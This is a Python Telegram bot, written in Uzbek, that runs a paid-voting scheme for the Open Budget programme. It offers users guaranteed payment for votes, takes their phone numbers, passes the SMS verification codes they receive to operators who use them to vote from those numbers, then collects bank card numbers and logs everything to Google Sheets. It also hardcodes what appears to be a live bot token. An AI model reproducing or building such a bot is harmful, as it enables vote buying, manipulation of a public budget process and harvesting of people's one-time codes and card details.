import asyncio
import logging
import json
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
import gspread
from oauth2client.service_account import ServiceAccountCredentials

# --- SOZLAMALAR ---
BOT_TOKEN = "8648555950:AAGRoZ6LfMlh7slXlHgyF6ebiq6bFT4ksqw"
ADMINS = [8317043750, 6139120765]  # Admin ID raqamlari
PAYMENTS_GROUP_LINK = "https://t.me/isbot111"  # To'lovlar guruh linki
GOOGLE_SHEET_NAME = "Openbudjet"  # Google Sheets jadvalingiz nomi

# --- LOGGING VA BOT INITIALIZATSIYASI ---
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Adminlar kimni band qilganini xotirada saqlash uchun global lug'at
claimed_users = {}


# --- GOOGLE SHEETS INTEGRATSIYASI (RAILWAY REJIMIDA) ---
def log_to_sheets(user_id, full_name="", username="", phone="", code="", card="", status="", admin_name=""):
    try:
        scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]

        # 🚀 Railway yoki lokal rejimni aniqlash
        google_creds_env = os.getenv("GOOGLE_CREDS")
        if google_creds_env:
            # Railway muhitida matn shaklidagi kalitni o'qiydi
            creds_dict = json.loads(google_creds_env)
            creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
        else:
            # Kompyuteringizda test qilayotganingizda open.json dan foydalanadi
            creds = ServiceAccountCredentials.from_json_keyfile_name("open.json", scope)

        client = gspread.authorize(creds)
        sheet = client.open(GOOGLE_SHEET_NAME).sheet1

        # Hamma ma'lumotlarni olyapmiz
        all_records = sheet.get_all_values()

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username_str = f"@{username}" if username else "Mavjud emas"

        row_index = -1
        # Jadval ichidan shu foydalanuvchi va aynan shu raqam mavjudligini qidiramiz
        for idx, row in enumerate(all_records):
            if len(row) >= 4:
                if row[0] == str(user_id) and row[3] == str(phone):
                    row_index = idx + 1  # Google Sheets'da qatorlar 1 dan boshlanadi
                    break

        if row_index != -1:
            # Foydalanuvchi mavjud bo'lsa, faqat kerakli kataklarni bitta qatorda yangilaymiz
            if code:
                sheet.update_cell(row_index, 5, str(code))
            if card:
                sheet.update_cell(row_index, 6, str(card))
            if status:
                sheet.update_cell(row_index, 7, status)
            sheet.update_cell(row_index, 8, now)
            if admin_name:
                sheet.update_cell(row_index, 9, admin_name)
            print(f"📝 Qator yangilandi: {row_index}-qator")
        else:
            # Yangi raqam kiritilganda yangi qator ochamiz
            sheet.append_row(
                [str(user_id), full_name, username_str, str(phone), str(code), str(card), status, now, admin_name])
            print("➕ Yangi raqam uchun yangi qator qo'shildi.")

    except Exception as e:
        print(f"❌ Google Sheets'ga yozishda xatolik: {e}")


# --- FSM (STATE) HOLATLARI ---
class VoteState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_screenshot = State()
    waiting_for_admin_check = State()
    waiting_for_card = State()


# --- KLAVIATURALAR ---
def main_menu():
    builder = ReplyKeyboardBuilder()
    builder.button(text="🗳 Ovoz berish")
    builder.button(text="💰 To'lovlar muvaffaqiyati")
    builder.button(text="🙋‍♂️ Yordam")
    builder.adjust(1, 2)
    return builder.as_markup(resize_keyboard=True)


def phone_share_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.button(text="📱 Telefon raqamni yuborish", request_contact=True)
    builder.button(text="❌ Bekor qilish")
    builder.adjust(1)
    return builder.as_markup(resize_keyboard=True)


# --- START BUYRUG'I ---
@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    welcome_text = (
        "👋 Assalomu alaykum! Open Budget ovoz berish botiga xush kelibsiz.\n\n"
        "QORABAYIR MFYga o'z ovozingizni berib, kafolatlangan to'lovga ega bo'lishingiz mumkin. "
        "Jarayon mutlaqo xavfsiz va tezkor amalga oshiriladi!"
    )
    await message.answer(welcome_text, reply_markup=main_menu())


@dp.message(F.text == "💰 To'lovlar muvaffaqiyati")
async def process_payments_info(message: types.Message):
    await message.answer(
        f"Bizning ishonchli ekanligimizni tekshirish uchun to'lovlar isbotlangan guruhimizga a'zo bo'ling:\n\n"
        f"🔗 <a href='{PAYMENTS_GROUP_LINK}'>To'lovlar Guruhimiz</a>",
        parse_mode="HTML",
        disable_web_page_preview=True
    )


@dp.message(F.text == "🙋‍♂️ Yordam")
async def process_help(message: types.Message):
    await message.answer("Muammo yoki savollar bo'yicha administratorga murojaat qiling:\n\n👉 @soibnazarov07")


# --- OVOZ BERISH JARAYONI ---
@dp.message(F.text == "🗳 Ovoz berish")
async def start_voting(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    await state.clear()

    # 🛠 ADMIN CLAIM XATOLIGINI TUZATISH: Yangi so'rovda eski bandlikni tozalaymiz
    if user_id in claimed_users:
        del claimed_users[user_id]

    await message.answer(
        "Iltimos, ovoz beradigan telefon raqamingizni quyidagi tugma orqali yuboring yoki o'zingiz qo'lda yozib kiriting:\n\n"
        "<b>(Format: +998901234567)</b>",
        parse_mode="HTML",
        reply_markup=phone_share_keyboard()
    )
    await state.set_state(VoteState.waiting_for_phone)


@dp.message(F.text == "❌ Bekor qilish", VoteState.waiting_for_phone)
async def cancel_voting(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("Ovoz berish jarayoni bekor qilindi.", reply_markup=main_menu())


# --- RAQAM QABUL QILISH ---
@dp.message(VoteState.waiting_for_phone, F.contact | F.text)
async def process_phone(message: types.Message, state: FSMContext):
    if message.text == "❌ Bekor qilish":
        await state.clear()
        await message.answer("Ovoz berish jarayoni bekor qilindi.", reply_markup=main_menu())
        return

    if message.contact:
        phone = message.contact.phone_number
        if not phone.startswith("+"):
            phone = "+" + phone
    else:
        phone = message.text

    user_id = message.from_user.id
    full_name = message.from_user.full_name
    username = message.from_user.username

    # Raqam kelganda ham kafolat uchun xotirani tozalaymiz
    if user_id in claimed_users:
        del claimed_users[user_id]

    await state.update_data(phone=phone, full_name=full_name, username=username)

    # Jadvalga dastlabki qator
    log_to_sheets(user_id=user_id, full_name=full_name, username=username, phone=phone, status="Raqam kiritildi")

    builder = InlineKeyboardBuilder()
    builder.button(text="✅ Qabul qilish (Band qilish)", callback_data=f"claim_{user_id}")

    for admin in ADMINS:
        try:
            await bot.send_message(
                admin,
                f"📱 <b>Yangi raqam keldi!</b>\n\n"
                f"👤 Foydalanuvchi: {full_name}\n"
                f"🌐 Username: @{username if username else 'yoq'}\n"
                f"🆔 ID: <code>{user_id}</code>\n"
                f"📞 Raqam: <code>{phone}</code> (ustiga bosing)\n\n"
                f"Kim birinchi bo'lib qabul qilsa, o'sha admin ushbu foydalanuvchi bilan ishlaydi.",
                parse_mode="HTML",
                reply_markup=builder.as_markup()
            )
        except Exception as e:
            print(f"⚠️ Admin [{admin}] ga xabar bormadi: {e}")

    await message.answer(
        "Raqamingiz qabul qilindi. Operatorlarimiz tez orada uni tizimga kiritishadi, kuting...",
        reply_markup=main_menu()
    )


# --- ADMIN BAND QILISH (CLAIM) HANDLING ---
@dp.callback_query(F.data.startswith("claim_"))
async def admin_claim(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    admin_id = callback.from_user.id
    admin_name = callback.from_user.full_name

    if user_id in claimed_users:
        already_claimed_by = claimed_users[user_id]
        await callback.answer(f"❌ Bu so'rovni allaqachon {already_claimed_by} qabul qilgan!", show_alert=True)
        try:
            await callback.message.edit_text(
                f"{callback.message.text}\n\n🔒 <b>Ushbu raqamni admin {already_claimed_by} o'ziga olgan!</b>",
                parse_mode="HTML"
            )
        except Exception:
            pass
        return

    claimed_users[user_id] = admin_name

    await callback.message.edit_text(
        f"{callback.message.text}\n\n🔒 <b>Ushbu raqamni admin {admin_name} o'ziga oldi!</b>",
        parse_mode="HTML"
    )
    await callback.answer("Siz ushbu foydalanuvchini band qildingiz!")

    user_state = dp.fsm.resolve_context(bot, chat_id=user_id, user_id=user_id)
    await user_state.set_state(VoteState.waiting_for_code)
    await user_state.update_data(admin_id=admin_id)

    user_data = await user_state.get_data()

    # Jadvalni yangilash
    log_to_sheets(
        user_id=user_id,
        phone=user_data.get("phone", ""),
        status="Admin qabul qildi",
        admin_name=admin_name
    )

    msg = await bot.send_message(
        user_id,
        "Sizning raqamingiz tizimga kiritildi! 📥\n"
        "Telefoningizga kelgan <b>SMS kodni</b> kiriting.\n"
        "⚠️ Vaqtingiz: <b>2:00 daqiqa</b>",
        parse_mode="HTML"
    )

    asyncio.create_task(countdown_timer(user_id, msg.message_id, user_state))


async def countdown_timer(user_id, message_id, state: FSMContext):
    total_seconds = 120
    while total_seconds > 0:
        await asyncio.sleep(10)
        total_seconds -= 10
        current_state = await state.get_state()
        if current_state != VoteState.waiting_for_code:
            return

        minutes, seconds = divmod(total_seconds, 60)
        try:
            await bot.edit_message_text(
                chat_id=user_id,
                message_id=message_id,
                text=f"Telefoningizga kelgan <b>SMS kodni</b> kiriting.\n⚠️ Qolgan vaqt: <b>{minutes:02d}:{seconds:02d} daqiqa</b>",
                parse_mode="HTML"
            )
        except Exception:
            pass

    current_state = await state.get_state()
    if current_state == VoteState.waiting_for_code:
        user_data = await state.get_data()
        await state.clear()
        if user_id in claimed_users:
            del claimed_users[user_id]
        await bot.send_message(user_id,
                               "⏱ Vaqt tugadi. Iltimos, qaytadan urinib ko'ring (Ovoz berish tugmasini bosing).")

        log_to_sheets(
            user_id=user_id,
            phone=user_data.get("phone", ""),
            status="Vaqt tugadi"
        )


# --- KOD KIRITILGANDA ---
@dp.message(VoteState.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text
    data = await state.get_data()
    admin_id = data.get("admin_id")
    user_id = message.from_user.id

    await state.update_data(code=code)
    admin_name = claimed_users.get(user_id, "Noma'lum")

    log_to_sheets(
        user_id=user_id,
        phone=data.get("phone", ""),
        code=code,
        status="Kod kiritildi",
        admin_name=admin_name
    )

    try:
        await bot.send_message(
            admin_id,
            f"🔑 <b>Foydalanuvchidan Kod Keldi!</b>\n\n"
            f"👤 Kimdan: {data.get('full_name')}\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"📞 Raqam: <code>{data.get('phone')}</code>\n"
            f"🔢 KOD: <code>{code}</code> (ustiga bosing)\n\n"
            f"Kodni kiritib bo'lgach, foydalanuvchiga tasdiqlash SMSi borishini kuting.",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"⚠️ Admin [{admin_id}] ga kodni yuborib bo'lmadi: {e}")

    await message.answer(
        "Raqam muvaffaqiyatli tasdiqlandi! 💸\n\n"
        "1 soat ichida sizga <b>'Sizning ovozingiz muvaffaqiyatli qabul qilindi'</b> degan sms boradi. "
        "O'sha smsni skrinshot (rasm) qilib shu yerga yuboring."
    )
    await state.set_state(VoteState.waiting_for_screenshot)


# --- SKRINSHOT YUBORILGANDA ---
@dp.message(VoteState.waiting_for_screenshot, F.photo)
async def process_screenshot(message: types.Message, state: FSMContext):
    photo_id = message.photo[-1].file_id
    data = await state.get_data()
    admin_id = data.get("admin_id")
    user_id = message.from_user.id

    admin_name = claimed_users.get(user_id, "Noma'lum")

    log_to_sheets(
        user_id=user_id,
        phone=data.get("phone", ""),
        status="Jarayonda (Skrinshot tashlandi)",
        admin_name=admin_name
    )

    builder = InlineKeyboardBuilder()
    builder.button(text="🟢 Muvaffaqiyatli o'tdi", callback_data=f"check_success_{user_id}")
    builder.button(text="🔴 Avval ovoz bergan", callback_data=f"check_already_{user_id}")
    builder.adjust(1, 1)

    try:
        await bot.send_photo(
            admin_id,
            photo_id,
            caption=f"📸 <b>Ovoz berilganlik haqica Skrinshot keldi!</b>\n\n"
                    f"👤 Kimdan: {data.get('full_name')}\n"
                    f"🆔 ID: <code>{user_id}</code>\n"
                    f"📞 Raqam: <code>{data.get('phone')}</code>\n\n"
                    f"⚠️ Iltimos, skrinshotni tekshirib quyidagi tugmalardan birini bosing:",
            parse_mode="HTML",
            reply_markup=builder.as_markup()
        )
    except Exception as e:
        print(f"⚠️ Admin [{admin_id}] ga skrinshotni yuborib bo'lmadi: {e}")

    await message.answer("Skrinshot qabul qilindi! Ovoz operator tomonidan tekshirilmoqda, kuting... ⏱")
    await state.set_state(VoteState.waiting_for_admin_check)


# --- ADMIN TEKSHIRUV NATIJALARI (CALLBACK) ---
@dp.callback_query(F.data.startswith("check_"))
async def handle_admin_check(callback: types.CallbackQuery):
    action = callback.data.split("_")[1]
    user_id = int(callback.data.split("_")[2])
    admin_name = callback.from_user.full_name

    user_state = dp.fsm.resolve_context(bot, chat_id=user_id, user_id=user_id)
    data = await user_state.get_data()

    if action == "success":
        log_to_sheets(
            user_id=user_id,
            phone=data.get("phone", ""),
            status="Muvaffaqiyatli",
            admin_name=admin_name
        )

        try:
            await callback.message.edit_caption(
                caption=f"{callback.message.caption}\n\n✅ <b>Qaror: Muvaffaqiyatli tasdiqlandi!</b> (Admin: {admin_name})",
                parse_mode="HTML"
            )
        except Exception:
            pass

        await callback.answer("Muvaffaqiyatli deb belgiladingiz!")

        await user_state.set_state(VoteState.waiting_for_card)
        await bot.send_message(
            user_id,
            "Tabriklaymiz! Ovozingiz muvaffaqiyatli tasdiqlandi. 🎉\n\n"
            "Endi pul o'tkazib berishimiz uchun <b>Plastik karta raqamingizni</b> yuboring:"
        )

    elif action == "already":
        log_to_sheets(
            user_id=user_id,
            phone=data.get("phone", ""),
            status="Avval ovoz bergan (Muvaffaqiyatsiz)",
            admin_name=admin_name
        )

        try:
            await callback.message.edit_caption(
                caption=f"{callback.message.caption}\n\n❌ <b>Qaror: Rad etildi (Avval ovoz bergan!)</b> (Admin: {admin_name})",
                parse_mode="HTML"
            )
        except Exception:
            pass

        await callback.answer("Avval ovoz bergan deb rad etdingiz.")

        await user_state.clear()
        if user_id in claimed_users:
            del claimed_users[user_id]

        await bot.send_message(
            user_id,
            "Uzr, tekshiruv davomida bu raqam orqali avval ham ovoz berilganligi aniqlandi. ❌\n"
            "Shu sababli ushbu arizangiz bekor qilindi.",
            reply_markup=main_menu()
        )


# --- KARTA RAQAM KIRITILGANDA (YAKUNIY BOSQICH) ---
@dp.message(VoteState.waiting_for_card)
async def process_card(message: types.Message, state: FSMContext):
    card_number = message.text
    data = await state.get_data()
    admin_id = data.get("admin_id")
    user_id = message.from_user.id

    admin_name = claimed_users.get(user_id, "Noma'lum")

    log_to_sheets(
        user_id=user_id,
        phone=data.get("phone", ""),
        card=card_number,
        status="Karta berildi (Yakunlandi)",
        admin_name=admin_name
    )

    try:
        await bot.send_message(
            admin_id,
            f"💳 <b>YAKUNIY BOSQICH: Karta Raqami Keldi!</b>\n\n"
            f"👤 Foydalanuvchi: {data.get('full_name')}\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"📞 Telefon: <code>{data.get('phone')}</code>\n"
            f"🔢 Kod: <code>{data.get('code')}</code>\n"
            f"💳 Karta: <code>{card_number}</code> (ustiga bosing)\n\n"
            f"Tasdiqlangan foydalanuvchiga 1 soat ichida to'lovni amalga oshiring.",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"⚠️ Admin [{admin_id}] ga karta raqamini yuborib bo'lmadi: {e}")

    await message.answer(
        "Ma'lumotlar saqlandi. ⏱ 1 soat ichida siz ko'rsatgan karta raqamiga to'lov amalga oshiriladi. Rahmat!",
        reply_markup=main_menu()
    )

    if user_id in claimed_users:
        del claimed_users[user_id]

    await state.clear()


# --- BOTNI ISHGA TUSHIRISH ---
async def main():
    print("Bot muvaffaqiyatli ishga tushdi...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())